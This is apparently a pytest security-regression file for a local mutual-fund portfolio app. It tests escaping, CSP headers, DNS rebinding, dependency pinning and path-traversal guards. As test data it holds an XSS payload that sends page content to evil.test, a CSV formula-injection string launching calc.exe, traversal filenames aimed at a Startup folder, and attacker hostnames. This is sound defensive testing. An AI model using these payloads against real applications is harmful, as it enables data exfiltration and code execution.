"""Security regressions. Written before the fixes.

Every case here was **demonstrated against the running code** before it was
written down, not inferred from a pattern. Two of them share a source: issuer
names come from AMC disclosure files fetched over the internet, so a hostile or
compromised disclosure is remote input that reaches a local page and a local
spreadsheet.

That framing was too narrow. The AMC's LISTING is the same trust boundary as
its content, and the filename in it reaches a filesystem write -- a worse sink
than either. See the download case below.

`src/m1_ledger/` is test-first by `CLAUDE.md`, which covers the ledger file-mode
case below.
"""

from __future__ import annotations

import hashlib
import json
import os
import re
import stat
import sys
from datetime import date
from decimal import Decimal
from pathlib import Path

import pytest
from fastapi.testclient import TestClient
from src.common.decimals import connect
from src.common.types import IssuerId, SchemeId, UserId
from src.m1_ledger.db import apply_ledger_schema, connect_ledger
from src.m3_lookthrough.engine import IssuerWeight, Position, compute_lookthrough
from src.m3_lookthrough.persist import save_lookthrough
from src.m6_views.api.app import create_app

from tests.conftest import migrated

USER = "USER-01"
AS_OF = date(2026, 9, 4)
JULY = date(2026, 7, 31)
S1 = SchemeId("S1")

#: A disclosure file supplies an instrument name; resolution turns it into an
#: issuer and `canonical_name` keeps it verbatim. Both payloads below are what
#: an attacker would put there.
XSS_NAME = (
    '</script><img src=x onerror="fetch(\'//evil.test/?d=\'+document.body.innerHTML)">'
)
FORMULA_NAME = "=cmd|'/c calc.exe'!A1"


def _client(tmp_path: Path, issuer_name: str) -> TestClient:
    warehouse_db = str(tmp_path / "w.db")
    migrated(warehouse_db)
    warehouse = connect(warehouse_db, check_same_thread=False)
    warehouse.execute(
        "INSERT OR REPLACE INTO issuer (issuer_id, canonical_name, is_listed)"
        " VALUES (?,?,1)",
        ("EVIL", issuer_name),
    )
    warehouse.commit()

    ledger = connect_ledger(
        str(tmp_path / "p.db"), key="test-key", check_same_thread=False
    )
    apply_ledger_schema(ledger)
    result = compute_lookthrough(
        [Position(S1, Decimal("100000"))],
        {S1: [IssuerWeight(IssuerId("EVIL"), Decimal("100"), "equity")]},
        AS_OF,
    )
    save_lookthrough(ledger, UserId(USER), AS_OF, result, {S1: JULY})
    # A real browser's address. The app refuses any other Host header.
    return TestClient(create_app(ledger, warehouse), base_url="http://127.0.0.1:8765")


QS = f"?user_id={USER}&as_of={AS_OF.isoformat()}"


# --- the script block ---------------------------------------------------------


def test_an_issuer_name_cannot_close_the_json_script_block(tmp_path: Path) -> None:
    """`json.dumps` escapes quotes and backslashes. It does NOT escape `<` or
    `/`, so `</script>` inside a string terminated the element and everything
    after it parsed as HTML.

    Demonstrated before the fix: the served page contained
    `</script><img src=x onerror=...>` and the image tag was live in the
    document, same-origin with `/api/*` — so it could read the whole portfolio
    and post it anywhere.
    """
    client = _client(tmp_path, XSS_NAME)
    html = client.get(f"/view/lookthrough_sankey{QS}").text

    # Counted, not matched. A non-greedy regex stops at the INJECTED terminator
    # and inspects the clean JSON in front of it — which is how the first
    # version of this test passed against vulnerable code. If the payload
    # closed the element, the document carries one more `</script>` than it has
    # opening tags.
    assert html.count("<script") == html.count("</script>")
    assert "</script><img" not in html
    # The string `onerror=` DOES appear, inside Jinja's escaped rendering of the
    # same name in the accessible table — `&lt;img src=x onerror=&#34;...`. That
    # is the escaping working, so the property to assert is that no LIVE tag was
    # produced, not that the characters are absent.
    assert "<img src=x" not in html


def test_the_escaped_payload_is_still_the_same_data(tmp_path: Path) -> None:
    """The fix must not corrupt what it protects. `\\u003c` is the same
    character to a JSON parser, so the browser reads the original name."""
    client = _client(tmp_path, XSS_NAME)
    html = client.get(f"/view/lookthrough_sankey{QS}").text
    block = re.search(r'<script id="sankey-data"[^>]*>(.*?)</script>', html, re.S)
    assert block

    payload = json.loads(block.group(1))
    labels = [n["label"] for n in payload["nodes"]]
    assert XSS_NAME in labels, "the escaping changed the data, not just its encoding"


def test_the_visible_label_is_html_escaped_too(tmp_path: Path) -> None:
    """Jinja autoescapes `{{ }}`, so the accessible table under the diagram is
    already safe. Asserted rather than assumed — it is the same string reaching
    a second sink."""
    client = _client(tmp_path, XSS_NAME)
    html = client.get(f"/view/lookthrough_sankey{QS}").text
    assert "&lt;/script&gt;" in html or "&lt;img" in html
    assert "<img src=x" not in html


# --- the CSV ------------------------------------------------------------------


def test_a_formula_cannot_lead_a_csv_cell(tmp_path: Path) -> None:
    """The export writes a UTF-8 BOM specifically so Excel opens it natively,
    which is the exact configuration CSV injection targets.

    Demonstrated before the fix, written unquoted and unprefixed:
        S1,EVIL,=cmd|'/c calc.exe'!A1,100000
    """
    client = _client(tmp_path, FORMULA_NAME)
    body = client.get(f"/api/export/lookthrough_sankey.csv{QS}").text

    rows = [
        line
        for line in body.lstrip("﻿").splitlines()
        if line and not line.startswith("#") and not line.startswith("scheme_id")
    ]
    assert rows, "nothing exported, so this proves nothing"
    for row in rows:
        for cell in row.split(","):
            bare = cell.strip().strip('"')
            assert not bare.startswith(("=", "+", "@", "\t", "\r")), cell


def test_a_negative_number_is_still_a_negative_number(tmp_path: Path) -> None:
    """`-` leads a formula AND every negative figure in this product. Neutering
    it blindly would turn a short position into text, so the guard must look at
    what follows."""
    from src.m6_views.export.csv import _cell

    assert _cell(Decimal("-1234.56")) == "-1234.56"
    assert _cell(Decimal("0")) == "0"
    assert _cell("Reliance Industries Ltd.") == "Reliance Industries Ltd."
    # And the dangerous forms are defanged.
    assert _cell("=1+1").startswith("'")
    assert _cell("-1+1").startswith("'")
    assert _cell("@SUM(A1)").startswith("'")


# --- the ledger file ----------------------------------------------------------


@pytest.mark.skipif(
    sys.platform == "win32",
    reason="Windows os.chmod only toggles the read-only bit; POSIX modes do not apply",
)
def test_the_ledger_is_not_readable_by_other_accounts(tmp_path: Path) -> None:
    """Measured before the fix: mode 0666. The contents are encrypted, so this
    is depth rather than disclosure — but an encrypted blob every local account
    can copy is an offline-attack target, and `allow_unencrypted=True` produces
    a PLAINTEXT ledger with the same mode."""
    path = tmp_path / "personal.db"
    conn = connect_ledger(str(path), key="test-key")
    apply_ledger_schema(conn)
    conn.close()

    mode = stat.S_IMODE(os.stat(path).st_mode)
    assert mode == 0o600, f"ledger created {oct(mode)}, expected 0o600"


def test_tightening_the_mode_never_breaks_the_open(tmp_path: Path) -> None:
    """Runs everywhere, including Windows: whatever the platform does with the
    permission bits, the ledger must still open and round-trip."""
    path = tmp_path / "personal.db"
    conn = connect_ledger(str(path), key="test-key")
    apply_ledger_schema(conn)
    conn.close()

    again = connect_ledger(str(path), key="test-key")
    assert again.execute("SELECT count(*) FROM position").fetchone()[0] == 0


# --- response headers ---------------------------------------------------------


@pytest.mark.parametrize("path", ["/api/health", "/api/views/lookthrough_sankey", "/"])
def test_a_rebound_hostname_is_refused(tmp_path: Path, path: str) -> None:
    """DNS rebinding. An attacker points their own hostname at 127.0.0.1; the
    browser then treats this API as same-origin with their page, which reads
    the portfolio. Demonstrated in the audit of 2026-09-23: `Host:
    attacker.example:8765` got a 200 and the holdings. The Host header is what
    still says who the request was for."""
    client = _client(tmp_path, "Acme Ltd.")
    for host in ("attacker.example:8765", "127.0.0.1.attacker.example"):
        assert client.get(f"{path}{QS}", headers={"Host": host}).status_code == 400
    for host in ("127.0.0.1:8765", "localhost:8765"):
        assert client.get(f"{path}{QS}", headers={"Host": host}).status_code == 200


@pytest.mark.parametrize("path", ["/api/views/lookthrough_sankey", "/view/fund_list"])
def test_a_malformed_date_is_the_callers_error_not_a_crash(
    tmp_path: Path, path: str
) -> None:
    """It was an unhandled ValueError: a 500, and without the security headers,
    because the exception left the middleware before they were set."""
    client = _client(tmp_path, "Acme Ltd.")
    response = client.get(f"{path}?as_of=notadate")
    assert response.status_code == 422
    assert "content-security-policy" in response.headers


@pytest.mark.parametrize("path", ["/", "/view/lookthrough_sankey", "/api/views"])
def test_every_response_carries_a_content_security_policy(
    tmp_path: Path, path: str
) -> None:
    """A CSP of `script-src 'self'` blocks the injected-image payload above even
    if the escaping regressed. Two independent defences, because the input is
    remote and the page holds the whole portfolio."""
    client = _client(tmp_path, "Acme Ltd.")
    headers = client.get(f"{path}{QS}").headers

    csp = headers.get("content-security-policy", "")
    assert "default-src 'self'" in csp
    assert "script-src 'self'" in csp
    assert "frame-ancestors 'none'" in csp
    assert headers.get("x-content-type-options") == "nosniff"
    assert headers.get("referrer-policy") == "no-referrer"


@pytest.mark.parametrize(
    ("path", "rule"),
    [
        ("/", "no-store"),
        ("/view/lookthrough_sankey", "no-store"),
        ("/api/views/portfolio_summary", "no-store"),
        ("/api/search?q=acme", "no-store"),
        ("/static/app.css", "no-cache"),
        ("/static/vendor/echarts.v6.1.0.min.js", "no-cache"),
    ],
)
def test_the_portfolio_never_reaches_the_disk_cache(
    tmp_path: Path, path: str, rule: str
) -> None:
    """A page or API response carries the decrypted portfolio: `no-store`.
    A static file is kept but revalidated, so an update is never masked by a
    stale stylesheet the browser guessed was still fresh."""
    client = _client(tmp_path, "Acme Ltd.")
    assert client.get(path).headers.get("cache-control") == rule


def test_the_csp_still_allows_the_vendored_d3(tmp_path: Path) -> None:
    """`script-src 'self'` must not block the scripts the page actually needs —
    a policy that breaks the flagship chart would be reverted within a day."""
    client = _client(tmp_path, "Acme Ltd.")
    html = client.get(f"/view/lookthrough_sankey{QS}").text
    assert '<script src="/static/vendor/d3.v7.min.js"></script>' in html
    assert client.get("/static/vendor/d3.v7.min.js").status_code == 200


# --- vendored third-party code ------------------------------------------------

VENDOR = Path(__file__).resolve().parents[2] / "src" / "m6_views" / "static" / "vendor"


def test_the_vendored_javascript_matches_its_recorded_hashes() -> None:
    """d3 is committed to this repository rather than loaded from a CDN, which
    removes a third party from every page load and replaces it with a question:
    is the copy in the tree the one that was reviewed?

    `SHA256SUMS` answers it. A swapped file fails here rather than silently
    running in the page that renders someone's finances.
    """
    sums = VENDOR / "SHA256SUMS"
    assert sums.exists(), "no integrity record for the vendored JavaScript"

    recorded = {}
    for line in sums.read_text(encoding="utf-8").splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        digest, name = line.split(None, 1)
        recorded[name.strip()] = digest

    on_disk = sorted(p.name for p in VENDOR.glob("*.js"))
    assert on_disk, "no vendored JavaScript found"
    assert sorted(recorded) == on_disk, "SHA256SUMS and the directory disagree"

    for name, digest in recorded.items():
        actual = hashlib.sha256((VENDOR / name).read_bytes()).hexdigest()
        assert actual == digest, f"{name} does not match its recorded hash"


# --- packaging ----------------------------------------------------------------


def test_every_third_party_import_is_declared() -> None:
    """`pdfplumber` and `pypdf` were imported by `cas/pdf.py` and declared
    nowhere, so `pip install -e .` followed by `python -m jobs.import_cas` — the
    workflow the README documents — failed with ImportError.

    They are deliberately imported inside the function so the ledger stays
    importable without them, which is a reason to make them an OPTIONAL
    dependency, not a reason to leave them undeclared.
    """
    import tomllib

    root = Path(__file__).resolve().parents[2]
    with open(root / "pyproject.toml", "rb") as fh:
        meta = tomllib.load(fh)["project"]

    declared = set()
    for spec in meta.get("dependencies", []):
        declared.add(re.split(r"[<>=~!\[ ]", spec, maxsplit=1)[0].lower())
    for group in meta.get("optional-dependencies", {}).values():
        for spec in group:
            declared.add(re.split(r"[<>=~!\[ ]", spec, maxsplit=1)[0].lower())

    for package in ("pdfplumber", "openpyxl", "httpx", "fastapi", "jinja2"):
        assert package in declared, f"{package} is imported but not declared"


def test_every_dependency_is_pinned_exactly() -> None:
    """A lower bound is not enough. It lets a fresh clone install whatever
    shipped that morning, so the gate certifies a program nobody has run —
    which is not a theory: CI resolved a newer FastAPI stack than this machine
    had and failed the type check on it."""
    for spec in _declared_dependencies():
        assert "==" in spec, f"{spec} is not pinned to a single version"


def _declared_dependencies() -> list[str]:
    """Every dependency `pyproject.toml` names, extras included."""
    import tomllib

    root = Path(__file__).resolve().parents[2]
    with open(root / "pyproject.toml", "rb") as fh:
        meta = tomllib.load(fh)["project"]
    specs = list(meta.get("dependencies", []))
    for group in meta.get("optional-dependencies", {}).values():
        specs.extend(group)
    assert specs
    return specs


def _normalise(name: str) -> str:
    """PEP 503: `PyYAML`, `pyyaml` and `py_yaml` are one project, and a lock
    file written by `pip freeze` does not use the spelling `pyproject.toml`
    happens to use."""
    return re.sub("[-_.]+", "-", name).lower()


def test_the_lock_pins_what_pyproject_cannot() -> None:
    """`pyproject.toml` can only pin the packages it names, and the one that
    broke CI was **starlette** — which it never names, because starlette
    arrives underneath FastAPI. Pinning the direct dependencies and stopping
    there would have left the actual cause free to move again."""
    root = Path(__file__).resolve().parents[2]
    lock = (root / "requirements.lock").read_text(encoding="utf-8")

    pinned: dict[str, str] = {}
    for raw in lock.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        assert "==" in line, f"lock entry is not an exact pin: {line}"
        name, _, version = line.partition("==")
        pinned[_normalise(name)] = version

    declared = _declared_dependencies()
    for spec in declared:
        name = _normalise(spec.split("==")[0])
        assert name in pinned, f"{name} is declared but missing from the lock"

    assert "starlette" in pinned, "the package that caused this is unpinned again"
    assert len(pinned) > len(declared), (
        "a lock that covers only the declared dependencies is not a lock"
    )


def test_no_money_path_accepts_a_non_finite_number() -> None:
    """`Decimal` parses "Infinity" and "NaN" without complaint, and both were
    reaching NAVs, units and weights.

    NaN is the one that matters. Every comparison against it is False, so it
    does not merely produce a wrong number — it walks through the guards meant
    to stop wrong numbers. `mfapi.py`'s `nav <= 0` check was exactly that: a
    NaN NAV passed it and was stored as a price.

    The dirty values below are not invented. They are what AMFI is documented
    to ship in these columns (captn3m0/historical-mf-data's known-issues list),
    cross-checked against this codebase.
    """
    from src.m0_data.normalise.numbers import CoercionError
    from src.m0_data.normalise.numbers import to_decimal as m0_to_decimal
    from src.m1_ledger.cas.parse import CasParseError
    from src.m1_ledger.cas.parse import to_decimal as m1_to_decimal

    for token in ("Infinity", "-Infinity", "NaN", "sNaN", "  NaN  "):
        with pytest.raises(CoercionError):
            m0_to_decimal(token)
        with pytest.raises(CasParseError):
            m1_to_decimal(token)

    # And the real numbers either module must still read.
    assert m0_to_decimal("1,23,456.78") == Decimal("123456.78")
    assert m1_to_decimal("(500.00)") == Decimal("-500.00")
    assert m0_to_decimal("814.4409") == Decimal("814.4409")
    # AMFI's other documented junk keeps behaving as it did.
    assert m0_to_decimal("N.A.") is None
    for token in ("#N/A", "#DIV/0!", "B.C.", "B. C."):
        with pytest.raises(CoercionError):
            m0_to_decimal(token)


def test_the_temp_directory_helper_is_not_used_for_secrets() -> None:
    """A sanity check on the one thing that would undo `import_cas` writing
    nothing: no module that touches a password may also write a temp file."""
    pdf = (
        Path(__file__).resolve().parents[2] / "src" / "m1_ledger" / "cas" / "pdf.py"
    ).read_text(encoding="utf-8")
    # `pdfplumber.open(buffer)` reads an in-memory BytesIO and is fine, so the
    # list names the calls that would put bytes on a disk.
    for forbidden in (
        "NamedTemporaryFile", "mkstemp", "mkdtemp", "write_bytes", "write_text",
        "gettempdir",
    ):
        assert forbidden not in pdf, f"{forbidden} in the module that holds a password"


# --- the AMC listing is untrusted too, and its filename reaches the disk -----


def _hostile(name: str) -> object:
    from src.m0_data.fetch.amc_direct import DiscoveredFile

    return DiscoveredFile(
        amc_id="kotak",
        as_of=date(2026, 8, 31),
        url="https://example.invalid/x",
        filename=name,
        kind="monthly",
        title="Portfolio as on August 31, 2026",
    )


def _served(monkeypatch: pytest.MonkeyPatch, body: bytes = b"PK\x03\x04payload") -> None:
    """`download` with the network replaced by a fixed body."""
    import jobs.fetch_amc as job

    class Response:
        content = body

        def raise_for_status(self) -> None:
            return None

    monkeypatch.setattr(job, "conditional_get", lambda *a, **k: Response())


CFG = {
    "user_agent": "t",
    "timeout_connect": 1,
    "timeout_read": 1,
    "retries": 0,
    "rate_limit_per_sec": 99,
    "burst": 1,
}


@pytest.mark.parametrize(
    "hostile",
    [
        "..\\..\\..\\Startup\\upd.bat",
        "../../../evil.bat",
        "C:/Windows/Temp/evil.ps1",
        "..",
        "",
    ],
)
def test_a_publisher_filename_cannot_escape_the_inbox(
    hostile: str, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A hijacked listing must not choose where bytes land.

    `into / name` contains nothing by itself: pathlib splits on both separators
    on Windows, honours `..`, and an absolute right operand discards the left
    entirely. Every other network-to-disk write here is content-addressed and
    ignores the publisher's name; this one needs it, so it takes the basename
    and an extension allow-list.
    """
    from jobs.fetch_amc import download
    from src.m0_data.fetch.base import FetchError

    _served(monkeypatch)
    inbox = tmp_path / "inbox"
    with pytest.raises(FetchError, match="refusing publisher filename"):
        download(_hostile(hostile), CFG, inbox)  # type: ignore[arg-type]

    escaped = [p for p in tmp_path.rglob("*") if p.is_file() and p.parent != inbox]
    assert not escaped, f"bytes written outside the inbox: {escaped}"


def test_a_traversing_name_with_a_real_extension_is_flattened(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The traversal is stripped rather than the download refused: the name is
    still a legitimate workbook name, it just stops being a path."""
    from jobs.fetch_amc import download

    _served(monkeypatch)
    inbox = tmp_path / "inbox"
    target = download(_hostile("..\\..\\evil.xlsx"), CFG, inbox)  # type: ignore[arg-type]

    assert target == inbox / "evil.xlsx"
    assert target.parent == inbox


def test_a_legitimate_publisher_name_still_downloads(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The guard must not break the happy path it wraps -- ICICI publishes a
    ZIP, Kotak an XLSX."""
    from jobs.fetch_amc import download

    _served(monkeypatch)
    inbox = tmp_path / "inbox"
    for name in ("Monthly-Portfolio-Disclosure-August-2026.zip", "FAD_Aug2026.xlsx"):
        assert download(_hostile(name), CFG, inbox).name == name  # type: ignore[arg-type]


def test_workbook_xml_is_parsed_defensively() -> None:
    """Every disclosure is a downloaded workbook, and openpyxl parses its XML
    with no guard against entity-expansion bombs unless `defusedxml` is
    installed -- which it switches to on its own. Pinned since the 2026-09-23
    audit, which found it present only by accident of the active environment."""
    import openpyxl.xml

    assert openpyxl.xml.DEFUSEDXML is True


class TestANewLedgerKey:
    """A new ledger's key was asked for once, at any length: a typo encrypted
    the ledger under a key nobody knew, and `a` was accepted. SQLCipher
    stretches the key, but a short key is still short against an offline copy
    of the file. An existing ledger's key is asked for once, as before."""

    @staticmethod
    def _typed(monkeypatch: pytest.MonkeyPatch, *answers: str) -> list[str]:
        asked: list[str] = []
        replies = iter(answers)

        def fake(prompt: str = "") -> str:
            asked.append(prompt)
            return next(replies)

        monkeypatch.setattr("jobs.import_cas.getpass.getpass", fake)
        return asked

    def test_it_is_typed_twice_and_must_match(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from jobs.import_cas import _ledger_key

        self._typed(monkeypatch, "correct horse battery", "correct horse batterY")
        with pytest.raises(SystemExit, match="differ"):
            _ledger_key(exists=False)

        asked = self._typed(monkeypatch, "correct horse battery", "correct horse battery")
        assert _ledger_key(exists=False) == "correct horse battery"
        assert len(asked) == 2

    def test_a_short_one_is_refused(self, monkeypatch: pytest.MonkeyPatch) -> None:
        from jobs.import_cas import MIN_KEY_LENGTH, _ledger_key

        self._typed(monkeypatch, "a" * (MIN_KEY_LENGTH - 1))
        with pytest.raises(SystemExit, match="at least"):
            _ledger_key(exists=False)

    def test_an_existing_ledger_is_asked_once(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        from jobs.import_cas import _ledger_key

        asked = self._typed(monkeypatch, "old-key")
        assert _ledger_key(exists=True) == "old-key"
        assert len(asked) == 1
